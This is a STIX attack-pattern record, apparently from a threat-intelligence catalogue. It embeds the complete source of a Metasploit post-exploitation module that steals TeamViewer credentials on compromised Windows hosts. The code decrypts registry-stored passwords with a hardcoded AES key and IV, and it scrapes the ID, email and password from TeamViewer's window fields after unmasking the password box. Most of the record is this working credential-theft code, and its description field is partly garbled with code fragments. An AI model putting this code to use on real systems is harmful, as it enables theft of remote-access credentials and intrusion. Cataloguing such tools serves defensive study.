{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6bd76e5a-3d1c-4ab8-af47-09f986f4423b",
    "created": "2024-08-14T16:33:11.446077Z",
    "modified": "2024-08-14T16:33:11.446081Z",
    "name": "Windows Gather TeamViewer Passwords",
    "description": "This module will find and decrypt stored TeamViewer passwords 'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/teamviewer_passwords.rb",
            "external_id": "teamviewer_passwords.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.cnblogs.com/Kali-Team/p/12468066.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n#\n# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb\n# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather TeamViewer Passwords',\n        'Description' => %q{ This module will find and decrypt stored TeamViewer passwords },\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'],\n          [ 'URL', 'https://www.cnblogs.com/Kali-Team/p/12468066.html' ]\n        ],\n        'Author' => [ 'Nic Losby <blurbdust[at]gmail.com>', 'Kali-Team <kali-team[at]qq.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_railgun_api_multi\n              stdapi_railgun_memread\n              stdapi_railgun_memwrite\n              stdapi_sys_process_get_processes\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('WINDOW_TITLE', [ false, 'Specify a title for getting the window handle, e.g. TeamViewer', 'TeamViewer']),\n      ]\n    )\n  end\n\n  def app_list\n    results = ''\n    keys = [\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version7', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version8', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version9', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version10', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version11', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version12', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version13', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version14', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version15', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer', 'Version' ],\n      [ 'HKLM\\\\SOFTWARE\\\\TeamViewer\\\\Temp', 'SecurityPasswordExported' ],\n      [ 'HKLM\\\\SOFTWARE\\\\TeamViewer', 'Version' ],\n    ]\n\n    locations = [\n      { value: 'OptionsPasswordAES', description: 'Options Password' },\n      { value: 'SecurityPasswordAES', description: 'Unattended Password' }, # for < v9.x\n      { value: 'SecurityPasswordExported', description: 'Exported Unattended Password' },\n      { value: 'ServerPasswordAES', description: 'Backend Server Password' }, # unused according to TeamViewer\n      { value: 'ProxyPasswordAES', description: 'Proxy Password' },\n      { value: 'LicenseKeyAES', description: 'Perpetual License Key' }, # for <= v14\n    ]\n\n    keys.each do |parent_key, _child_key|\n      locations.each do |location|\n        secret = registry_getvaldata(parent_key, location[:value])\n        next if secret.nil?\n\n        plaintext = decrypt(secret)\n        next if plaintext.nil?\n\n        print_good(\"Found #{location[:description]}: #{plaintext}\")\n        results << \"#{location[:description]}: #{plaintext}\\n\"\n        store_valid_credential(\n          user: nil,\n          private: plaintext,\n          private_type: :password,\n          service_data: {\n            address: session.session_host,\n            last_attempted_at: nil,\n            origin_type: :session,\n            port: 5938, # https://community.teamviewer.com/t5/Knowledge-Base/Which-ports-are-used-by-TeamViewer/ta-p/4139\n            post_reference_name: refname,\n            protocol: 'tcp',\n            service_name: 'teamviewer',\n            session_id: session_db_id,\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n        )\n      end\n    end\n\n    # Only save data to disk when there's something in the table\n    unless results.empty?\n      path = store_loot('host.teamviewer_passwords', 'text/plain', session, results, 'teamviewer_passwords.txt', 'TeamViewer Passwords')\n      print_good(\"Passwords stored in: #{path}\")\n    end\n  end\n\n  def decrypt(encrypted_data)\n    password = ''\n    return password unless encrypted_data\n\n    password = ''\n\n    key = \"\\x06\\x02\\x00\\x00\\x00\\xa4\\x00\\x00\\x52\\x53\\x41\\x31\\x00\\x04\\x00\\x00\"\n    iv = \"\\x01\\x00\\x01\\x00\\x67\\x24\\x4F\\x43\\x6E\\x67\\x62\\xF2\\x5E\\xA8\\xD7\\x04\"\n    aes = OpenSSL::Cipher.new('AES-128-CBC')\n    begin\n      aes.decrypt\n      aes.key = key\n      aes.iv = iv\n      plaintext = aes.update(encrypted_data)\n      password = Rex::Text.to_ascii(plaintext, 'utf-16le')\n      if plaintext.empty?\n        return nil\n      end\n    rescue OpenSSL::Cipher::CipherError => e\n      print_error(\"Unable to decrypt the data. Exception: #{e}\")\n    end\n\n    password\n  end\n\n  def get_window_text(window_hwnd)\n    if window_hwnd\n      addr = session.railgun.util.alloc_and_write_wstring('Kali-Team')\n      client.railgun.user32.SendMessageW(window_hwnd, 'WM_GETTEXT', 1024, addr)\n      text = session.railgun.util.read_wstring(addr)\n      client.railgun.multi([\n        ['kernel32', 'VirtualFree', [addr, 0, MEM_RELEASE]],\n      ])\n      if text.strip == ''\n        return nil\n      else\n        return text\n      end\n    else\n      return nil\n    end\n  end\n\n  # EnumWindows Function not work in RailGun, I don't know how to define the lpEnumFunc parameter\n  def enum_id_and_password(hwnd_main)\n    hwnd_mwrcp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'MainWindowRemoteControlPage', nil)\n    hwnd_irccv = client.railgun.user32.FindWindowExW(hwnd_mwrcp['return'], nil, 'IncomingRemoteControlComponentView', nil)\n    hwnd_custom_runner_id = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], nil, 'CustomRunner', nil)\n    hwnd_custom_runner_pass = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], hwnd_custom_runner_id['return'], 'CustomRunner', nil)\n    #  find edit box handle\n    hwnd_id_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_id['return'], nil, 'Edit', nil)\n    print_status(\"Found handle to ID edit box 0x#{hwnd_id_edit_box['return'].to_s(16).rjust(8, '0')}\")\n    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_pass['return'], nil, 'Edit', nil)\n    print_status(\"Found handle to Password edit box 0x#{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}\")\n    #  get window text\n    if hwnd_id_edit_box['return'] && hwnd_pass_edit_box['return']\n      print_good(\"ID: #{get_window_text(hwnd_id_edit_box['return'])}\")\n      print_good(\"PASSWORD: #{get_window_text(hwnd_pass_edit_box['return'])}\")\n    else\n      print_error('Handle for TeamViewer ID or password edit box not found')\n    end\n  end\n\n  def enum_email_and_password(hwnd_main)\n    hwnd_lp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'LoginPage', nil)\n    hwnd_lfv = client.railgun.user32.FindWindowExW(hwnd_lp['return'], nil, 'LoginFormView', nil)\n    #  find edit box handle\n    hwnd_email_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], nil, 'Edit', nil)\n    print_status(\"Found handle to Email edit box 0x#{hwnd_email_edit_box['return'].to_s(16).rjust(8, '0')}\")\n    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], hwnd_email_edit_box['return'], 'Edit', nil)\n    print_status(\"Found handle to Password edit box 0x#{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}\")\n    #  Remove ES_PASSWORD style\n    #  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowlongw\n    #  https://docs.microsoft.com/en-us/windows/win32/controls/edit-control-styles\n    #  GWL_STYLE  -16\n    client.railgun.user32.SetWindowWord(hwnd_pass_edit_box['return'], -16, 0)\n    #  get window text\n    email_text = get_window_text(hwnd_email_edit_box['return'])\n    pass_text = get_window_text(hwnd_pass_edit_box['return'])\n    if email_text\n      print_good(\"EMAIL: #{email_text}\")\n    else\n      print_error('Handle for TeamViewer ID or Password edit box not found')\n    end\n    if pass_text\n      print_good(\"PASSWORD: #{pass_text}\")\n    else\n      print_error('No password in Password edit box')\n    end\n  end\n\n  def run\n    print_status(\"Finding TeamViewer Passwords on #{sysinfo['Computer']}\")\n    app_list\n\n    print_status('<---------------- | Using Window Technique | ---------------->')\n    parent_key = 'HKEY_CURRENT_USER\\\\Software\\\\TeamViewer'\n    language = registry_getvaldata(parent_key, 'SelectedLanguage')\n    version = registry_getvaldata(parent_key, 'IntroscreenShownVersion')\n    print_status(\"TeamViewer's language setting options are '#{language}'\")\n    print_status(\"TeamViewer's version is '#{version}'\")\n    hwnd = client.railgun.user32.FindWindowW('#32770', datastore['WINDOW_TITLE'])['return']\n\n    #  Try to get window handle through registry\n    if !hwnd\n      hwnd = registry_getvaldata(parent_key, 'MainWindowHandle')\n    end\n    if hwnd != 0\n      print_good(\"TeamViewer's  title is '#{get_window_text(hwnd)}'\")\n      enum_id_and_password(hwnd)\n      enum_email_and_password(hwnd)\n    else\n      if !session.sys.process.each_process.find { |i| i['name'].downcase == 'TeamViewer.exe'.downcase }\n        print_error('Unable to find TeamViewer\\'s process')\n        return false\n      end\n      print_error('Unable to find TeamViewer\\'s window. Try to set window title')\n      return false\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Nic Losby <blurbdust[at]gmail.com>",
        "Kali-Team <kali-team[at]qq.com>]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}